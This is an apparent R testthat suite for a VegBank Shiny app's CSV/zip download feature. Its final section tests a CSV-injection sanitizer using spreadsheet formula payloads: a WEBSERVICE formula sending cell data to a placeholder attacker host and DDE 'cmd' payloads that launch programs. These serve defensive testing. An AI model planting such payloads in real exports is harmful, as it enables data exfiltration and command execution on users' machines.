test_that("TABLE_DOWNLOAD_CONFIG has correct structure", {
  expect_true(is.list(TABLE_DOWNLOAD_CONFIG))
  expect_true("plot_table" %in% names(TABLE_DOWNLOAD_CONFIG))

  config <- TABLE_DOWNLOAD_CONFIG$plot_table
  expect_equal(config$resource, "plot-observations")
  expect_true(config$has_nested)
  expect_equal(config$primary_key, "ob_code")
})

test_that("get_table_filter_state extracts search term", {
  # Create a mock state with a function that returns NULL (simulating reactive behavior)
  input <- list(plot_table_search = "oak")
  state <- list(plot_filter = function() NULL)

  result <- shiny::isolate(get_table_filter_state("plot_table", input, state))

  expect_equal(result$search, "oak")
  expect_null(result$filter)
})

test_that("get_table_filter_state extracts cross-resource filter", {
  input <- list(plot_table_search = NULL)
  state <- list(plot_filter = function() list(type = "project", code = "pj.123", label = "Test Project"))

  result <- shiny::isolate(get_table_filter_state("plot_table", input, state))

  expect_null(result$search)
  expect_equal(result$filter$type, "project")
  expect_equal(result$filter$code, "pj.123")
})

test_that("detect_nested_columns identifies nested data frames", {
  data <- data.frame(
    ob_code = c("ob.1", "ob.2"),
    latitude = c(38.5, 39.0),
    top_taxon_observations = I(list(
      data.frame(name = "Oak", cover = 25),
      data.frame(name = "Pine", cover = 30)
    )),
    top_classifications = I(list(
      data.frame(comm_name = "Forest"),
      data.frame(comm_name = "Wetland")
    ))
  )

  result <- detect_nested_columns(data)

  expect_true(is.character(result))
  expect_true("top_taxon_observations" %in% result)
  expect_true("top_classifications" %in% result)
  expect_false("ob_code" %in% result)
  expect_false("latitude" %in% result)
})

test_that("detect_nested_columns returns empty for data without nested columns", {
  data <- data.frame(
    ob_code = c("ob.1", "ob.2"),
    latitude = c(38.5, 39.0)
  )

  result <- detect_nested_columns(data)

  expect_true(is.character(result))
  expect_equal(length(result), 0)
})

test_that("extract_nested_table_with_fk handles empty data", {
  data <- data.frame(ob_code = character(0))

  result <- extract_nested_table_with_fk(data, "top_taxon_observations", "ob_code")

  expect_true(is.data.frame(result))
  expect_equal(nrow(result), 0)
})

test_that("extract_nested_table_with_fk extracts and adds foreign key", {
  data <- data.frame(
    ob_code = c("ob.1", "ob.2"),
    top_taxon_observations = I(list(
      data.frame(name = c("Oak", "Maple"), cover = c(25, 15)),
      data.frame(name = c("Pine"), cover = c(30))
    ))
  )

  result <- extract_nested_table_with_fk(data, "top_taxon_observations", "ob_code")

  expect_true(is.data.frame(result))
  expect_equal(nrow(result), 3)
  expect_true("ob_code" %in% names(result))
  expect_equal(result$ob_code, c("ob.1", "ob.1", "ob.2"))
  expect_equal(result$name, c("Oak", "Maple", "Pine"))
})

test_that("prepare_csv_tables splits nested data correctly", {
  config <- TABLE_DOWNLOAD_CONFIG$plot_table

  data <- data.frame(
    ob_code = c("ob.1", "ob.2"),
    latitude = c(38.5, 39.0),
    longitude = c(-78.2, -79.0),
    top_taxon_observations = I(list(
      data.frame(name = "Oak", cover = 25),
      data.frame(name = "Pine", cover = 30)
    )),
    top_classifications = I(list(
      data.frame(comm_name = "Forest"),
      data.frame()
    )),
    disturbances = I(list(data.frame(), data.frame())),
    soils = I(list(data.frame(), data.frame()))
  )

  result <- prepare_csv_tables(data, config)

  expect_true(is.list(result))
  expect_true("main" %in% names(result))
  # Check for new friendly names (not old API names)
  expect_true("taxon_observations" %in% names(result))
  expect_true("community_classifications" %in% names(result))

  # Main table should not have nested columns
  expect_false("top_taxon_observations" %in% names(result$main))
  expect_true("latitude" %in% names(result$main))

  # taxon_observations table should have foreign key
  expect_true("ob_code" %in% names(result$taxon_observations))
  expect_equal(nrow(result$taxon_observations), 2)

  # community_classifications table should have data
  expect_true("ob_code" %in% names(result$community_classifications))
  expect_equal(nrow(result$community_classifications), 1)
})

test_that("create_download_readme generates valid content", {
  config <- TABLE_DOWNLOAD_CONFIG$plot_table
  filter_state <- list(
    search = "oak",
    filter = list(type = "project", code = "pj.123", label = "Test Project")
  )
  csv_tables <- list(
    main = data.frame(ob_code = "ob.1"),
    taxon_observations = data.frame(ob_code = "ob.1", name = "Oak")
  )

  readme <- create_download_readme(config, filter_state, 100, csv_tables)

  expect_true(is.character(readme))
  expect_true(grepl("VegBank Data Download", readme))
  expect_true(grepl("Records: 100", readme))
  expect_true(grepl("Search Filter: oak", readme))
  expect_true(grepl("Resource Filter: project = pj.123", readme))
  expect_true(grepl("main.csv", readme))
  expect_true(grepl("taxon_observations.csv", readme))
})

test_that("DOWNLOAD_MAX_RECORDS is set correctly", {
  expect_equal(DOWNLOAD_MAX_RECORDS, 20000L)
})

test_that("get_table_filter_state handles both search and filter", {
  input <- list(plot_table_search = "pine")
  state <- list(plot_filter = function() list(type = "party", code = "pt.456", label = "Test Party"))

  result <- shiny::isolate(get_table_filter_state("plot_table", input, state))

  expect_equal(result$search, "pine")
  expect_equal(result$filter$type, "party")
  expect_equal(result$filter$code, "pt.456")
  expect_equal(result$filter$label, "Test Party")
})

test_that("get_table_filter_state handles whitespace in search", {
  input <- list(plot_table_search = "  oak  ")
  state <- list(plot_filter = function() NULL)

  result <- shiny::isolate(get_table_filter_state("plot_table", input, state))

  expect_equal(result$search, "  oak  ")
})

test_that("get_table_filter_state handles invalid filter info", {
  input <- list(plot_table_search = NULL)
  # Filter missing required fields
  state <- list(plot_filter = function() list(type = "project"))

  result <- shiny::isolate(get_table_filter_state("plot_table", input, state))

  expect_null(result$search)
  expect_null(result$filter)
})

test_that("detect_nested_columns handles NULL data", {
  result <- detect_nested_columns(NULL)
  expect_equal(length(result), 0)
})

test_that("detect_nested_columns handles empty lists", {
  data <- data.frame(
    ob_code = c("ob.1"),
    empty_list = I(list(list()))
  )

  result <- detect_nested_columns(data)

  expect_false("empty_list" %in% result)
})

test_that("detect_nested_columns handles mixed list types", {
  data <- data.frame(
    ob_code = c("ob.1", "ob.2"),
    nested_df = I(list(
      data.frame(x = 1),
      data.frame(x = 2)
    )),
    nested_list = I(list(list(a = 1), list(b = 2))),
    nested_vector = I(list(c(1, 2), c(3, 4)))
  )

  result <- detect_nested_columns(data)

  expect_true("nested_df" %in% result)
  expect_false("nested_list" %in% result)
  expect_false("nested_vector" %in% result)
})

test_that("extract_nested_table_with_fk handles missing column", {
  data <- data.frame(
    ob_code = c("ob.1", "ob.2"),
    latitude = c(38.5, 39.0)
  )

  result <- extract_nested_table_with_fk(data, "nonexistent_column", "ob_code")

  expect_true(is.data.frame(result))
  expect_equal(nrow(result), 0)
})

test_that("extract_nested_table_with_fk handles NULL values in nested column", {
  data <- data.frame(
    ob_code = c("ob.1", "ob.2", "ob.3"),
    nested = I(list(
      data.frame(val = 1),
      NULL,
      data.frame(val = 2)
    ))
  )

  result <- extract_nested_table_with_fk(data, "nested", "ob_code")

  expect_true(is.data.frame(result))
  expect_equal(nrow(result), 2)
  expect_equal(result$ob_code, c("ob.1", "ob.3"))
})

test_that("extract_nested_table_with_fk preserves column order", {
  data <- data.frame(
    ob_code = c("ob.1"),
    nested = I(list(
      data.frame(z = 3, y = 2, x = 1)
    ))
  )

  result <- extract_nested_table_with_fk(data, "nested", "ob_code")

  # Foreign key should be first
  expect_equal(names(result)[1], "ob_code")
  # Other columns should follow
  expect_true(all(c("z", "y", "x") %in% names(result)))
})

test_that("prepare_csv_tables handles data without nested columns", {
  config <- list(
    has_nested = FALSE,
    primary_key = "id"
  )

  data <- data.frame(
    id = c(1, 2),
    value = c("a", "b")
  )

  result <- prepare_csv_tables(data, config)

  expect_true("main" %in% names(result))
  expect_equal(length(result), 1)
  expect_equal(nrow(result$main), 2)
})

test_that("prepare_csv_tables removes all list columns from main table", {
  config <- TABLE_DOWNLOAD_CONFIG$plot_table

  data <- data.frame(
    ob_code = c("ob.1"),
    latitude = 38.5,
    nested1 = I(list(data.frame(x = 1))),
    nested2 = I(list(data.frame(y = 2))),
    regular = "value"
  )

  result <- prepare_csv_tables(data, config)

  expect_false("nested1" %in% names(result$main))
  expect_false("nested2" %in% names(result$main))
  expect_true("latitude" %in% names(result$main))
  expect_true("regular" %in% names(result$main))
})

test_that("prepare_csv_tables skips empty nested tables", {
  config <- TABLE_DOWNLOAD_CONFIG$plot_table

  data <- data.frame(
    ob_code = c("ob.1", "ob.2"),
    nested_empty = I(list(data.frame(), data.frame())),
    nested_full = I(list(data.frame(x = 1), data.frame(x = 2)))
  )

  result <- prepare_csv_tables(data, config)

  expect_false("nested_empty" %in% names(result))
  expect_true("nested_full" %in% names(result))
})

test_that("create_download_readme handles no filters", {
  config <- TABLE_DOWNLOAD_CONFIG$plot_table
  filter_state <- list(search = NULL, filter = NULL)
  csv_tables <- list(main = data.frame(ob_code = "ob.1"))

  readme <- create_download_readme(config, filter_state, 50, csv_tables)

  expect_true(grepl("Records: 50", readme))
  expect_false(grepl("Search Filter:", readme))
  expect_false(grepl("Resource Filter:", readme))
})

test_that("create_download_readme includes filter label", {
  config <- TABLE_DOWNLOAD_CONFIG$plot_table
  filter_state <- list(
    search = NULL,
    filter = list(type = "project", code = "pj.789", label = "My Project")
  )
  csv_tables <- list(main = data.frame(ob_code = "ob.1"))

  readme <- create_download_readme(config, filter_state, 10, csv_tables)

  expect_true(grepl("My Project", readme))
})

test_that("create_download_readme handles filter without label", {
  config <- TABLE_DOWNLOAD_CONFIG$plot_table
  filter_state <- list(
    search = NULL,
    filter = list(type = "project", code = "pj.789")
  )
  csv_tables <- list(main = data.frame(ob_code = "ob.1"))

  readme <- create_download_readme(config, filter_state, 10, csv_tables)

  expect_true(grepl("project = pj.789", readme))
  expect_false(grepl("\\(\\)", readme)) # Should not have empty parentheses
})

test_that("create_download_readme includes nested table descriptions", {
  config <- TABLE_DOWNLOAD_CONFIG$plot_table
  filter_state <- list(search = NULL, filter = NULL)
  csv_tables <- list(
    main = data.frame(ob_code = "ob.1"),
    taxon_observations = data.frame(ob_code = "ob.1", name = "Oak"),
    community_classifications = data.frame(ob_code = "ob.1", comm = "Forest")
  )

  readme <- create_download_readme(config, filter_state, 1, csv_tables)

  expect_true(grepl("taxon_observations.csv", readme))
  expect_true(grepl("community_classifications.csv", readme))
  expect_true(grepl("linked by ob_code", readme))
  expect_true(grepl("Example \\(R\\)", readme))
  expect_true(grepl("merge\\(", readme))
})

test_that("create_download_readme handles single main table", {
  config <- TABLE_DOWNLOAD_CONFIG$plot_table
  filter_state <- list(search = NULL, filter = NULL)
  csv_tables <- list(main = data.frame(ob_code = "ob.1"))

  readme <- create_download_readme(config, filter_state, 1, csv_tables)

  expect_true(grepl("main.csv", readme))
  expect_false(grepl("Example \\(R\\)", readme))
})

# CSV INJECTION PREVENTION TESTS =================================================================

test_that("sanitize_csv_injection prefixes formula characters with tab", {
  df <- data.frame(
    safe = c("Normal text", "Another value"),
    formula_equals = c("=1+1", "safe"),
    formula_plus = c("+1", "safe"),
    formula_minus = c("-1", "safe"),
    formula_at = c("@SUM(A1)", "safe"),
    formula_pipe = c("|command", "safe"),
    formula_percent = c("%macro", "safe"),
    stringsAsFactors = FALSE
  )

  result <- sanitize_csv_injection(df)

  # Safe values should be unchanged
  expect_equal(result$safe, df$safe)

  # Formula characters should be prefixed with tab
  expect_equal(result$formula_equals[1], "\t=1+1")
  expect_equal(result$formula_equals[2], "safe")

  expect_equal(result$formula_plus[1], "\t+1")
  expect_equal(result$formula_plus[2], "safe")

  expect_equal(result$formula_minus[1], "\t-1")
  expect_equal(result$formula_minus[2], "safe")

  expect_equal(result$formula_at[1], "\t@SUM(A1)")
  expect_equal(result$formula_at[2], "safe")

  expect_equal(result$formula_pipe[1], "\t|command")
  expect_equal(result$formula_pipe[2], "safe")

  expect_equal(result$formula_percent[1], "\t%macro")
  expect_equal(result$formula_percent[2], "safe")
})

test_that("sanitize_csv_injection handles realistic attack vectors", {
  df <- data.frame(
    location = c("California", "Texas"),
    notes = c(
      "=WEBSERVICE(\"https://attacker/?x=\"&A1)",
      "Normal observation notes"
    ),
    author = c("Dr. Smith", "@cmd|'/c calc'!A1"),
    project_name = c("+1-1+cmd|'/c calc'!A1", "Grassland Survey"),
    stringsAsFactors = FALSE
  )

  result <- sanitize_csv_injection(df)

  # Check that dangerous formulas are neutralized
  expect_true(startsWith(result$notes[1], "\t"))
  expect_equal(result$notes[2], "Normal observation notes")

  expect_true(startsWith(result$author[2], "\t"))
  expect_equal(result$author[1], "Dr. Smith")

  expect_true(startsWith(result$project_name[1], "\t"))
  expect_equal(result$project_name[2], "Grassland Survey")
})

test_that("sanitize_csv_injection only processes character columns", {
  df <- data.frame(
    text = c("=formula", "safe"),
    numeric = c(1, 2),
    logical = c(TRUE, FALSE),
    factor_col = factor(c("=level1", "level2")),
    stringsAsFactors = FALSE
  )

  result <- sanitize_csv_injection(df)

  # Character column should be sanitized
  expect_equal(result$text[1], "\t=formula")

  # Numeric, logical, and factor columns should be unchanged
  expect_equal(result$numeric, df$numeric)
  expect_equal(result$logical, df$logical)
  expect_equal(result$factor_col, df$factor_col)
})

test_that("sanitize_csv_injection handles NA values", {
  df <- data.frame(
    col1 = c("=formula", NA, "safe", NA),
    col2 = c(NA, "+formula", NA, "safe"),
    stringsAsFactors = FALSE
  )

  result <- sanitize_csv_injection(df)

  expect_equal(result$col1[1], "\t=formula")
  expect_true(is.na(result$col1[2]))
  expect_equal(result$col1[3], "safe")
  expect_true(is.na(result$col1[4]))

  expect_true(is.na(result$col2[1]))
  expect_equal(result$col2[2], "\t+formula")
  expect_true(is.na(result$col2[3]))
  expect_equal(result$col2[4], "safe")
})

test_that("sanitize_csv_injection handles empty data frames", {
  df_empty <- data.frame()
  result <- sanitize_csv_injection(df_empty)
  expect_equal(nrow(result), 0)

  df_no_rows <- data.frame(col1 = character(), col2 = character())
  result <- sanitize_csv_injection(df_no_rows)
  expect_equal(nrow(result), 0)
  expect_equal(names(result), c("col1", "col2"))
})

test_that("sanitize_csv_injection handles NULL input", {
  result <- sanitize_csv_injection(NULL)
  expect_null(result)
})

test_that("sanitize_csv_injection preserves data frame structure", {
  df <- data.frame(
    a = c("=test", "safe"),
    b = c(1, 2),
    c = c("normal", "+danger"),
    stringsAsFactors = FALSE
  )

  result <- sanitize_csv_injection(df)

  expect_equal(nrow(result), nrow(df))
  expect_equal(ncol(result), ncol(df))
  expect_equal(names(result), names(df))
  expect_equal(class(result), class(df))
})

test_that("sanitize_csv_injection handles formulas mid-string", {
  df <- data.frame(
    text = c("This is =formula", "=start formula", "safe text =middle"),
    stringsAsFactors = FALSE
  )

  result <- sanitize_csv_injection(df)

  # Only formulas at the START of string should be sanitized
  expect_equal(result$text[1], "This is =formula") # Not at start
  expect_equal(result$text[2], "\t=start formula") # At start
  expect_equal(result$text[3], "safe text =middle") # Not at start
})

test_that("sanitize_csv_injection handles whitespace edge cases", {
  df <- data.frame(
    text = c(" =formula", "=formula ", " safe", ""),
    stringsAsFactors = FALSE
  )

  result <- sanitize_csv_injection(df)

  # Space before = means it's not at start, should NOT be sanitized
  expect_equal(result$text[1], " =formula")
  # = at start with trailing space, SHOULD be sanitized
  expect_equal(result$text[2], "\t=formula ")
  # Normal space at start, should NOT be sanitized
  expect_equal(result$text[3], " safe")
  # Empty string should remain empty
  expect_equal(result$text[4], "")
})

test_that("create_download_zip sanitizes all tables", {
  config <- TABLE_DOWNLOAD_CONFIG$plot_table
  filter_state <- list(search = NULL, filter = NULL)

  csv_tables <- list(
    main = data.frame(
      ob_code = "ob.1",
      notes = "=WEBSERVICE(\"https://evil.com\")",
      stringsAsFactors = FALSE
    ),
    taxon_observations = data.frame(
      ob_code = "ob.1",
      name = "+cmd|'/c calc'!A1",
      stringsAsFactors = FALSE
    )
  )

  zip_path <- create_download_zip(csv_tables, config, filter_state)

  expect_true(file.exists(zip_path))

  # Extract and verify sanitization
  temp_extract <- tempfile()
  dir.create(temp_extract)
  on.exit(unlink(temp_extract, recursive = TRUE), add = TRUE)

  zip::unzip(zip_path, exdir = temp_extract)

  # Read back the main CSV and check sanitization
  main_csv <- read.csv(file.path(temp_extract, "main.csv"), stringsAsFactors = FALSE)
  expect_true(startsWith(main_csv$notes[1], "\t"))

  # Read back the nested CSV and check sanitization
  taxa_csv <- read.csv(file.path(temp_extract, "taxon_observations.csv"), stringsAsFactors = FALSE)
  expect_true(startsWith(taxa_csv$name[1], "\t"))
})
